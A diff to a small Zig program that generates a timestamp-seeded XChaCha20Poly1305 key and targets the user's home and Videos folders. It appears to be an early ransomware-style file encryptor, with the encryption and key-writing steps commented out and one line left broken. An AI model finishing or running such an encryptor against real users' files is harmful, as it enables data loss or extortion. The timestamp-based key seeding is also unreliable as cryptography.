@@ -4,11 +4,13 @@ const fs = std.fs;
 const mem = std.mem;
 const rand = std.rand;
 const algo = std.crypto.aead.chacha_poly.XChaCha20Poly1305;
+const kf = @import("known-folders");
 
 pub fn main() anyerror!void {
-    var folderPath = "~/Videos/";
-    _ = folderPath;
-    var keyFilePath = "~/key.txt";
+    var homeFolder = kf.KnownFolder.home;
+    _ = homeFolder;
+    var targetFolder = kf.KnownFolder.videos;
+    _ = targetFolder;
 
     // Generate a random key
     const timeArr: [8]u8 = @bitCast(std.time.milliTimestamp());
@@ -28,9 +30,9 @@ pub fn main() anyerror!void {
     prng.fill(&key);
 
     // Write the key to the key file
-    const keyFile = try fs.createFileAbsolute(keyFilePath, fs.File.CreateFlags{});
-    defer keyFile.close();
-    try keyFile.writeAll(key[0..]);
+    // const keyFile = homeFolder.;
+    // defer keyFile.close();
+    // try keyFile.writeAll(key[0..]);
 
     // // Encrypt files in the folder
     // const dir = try os.openDir(folderPath);
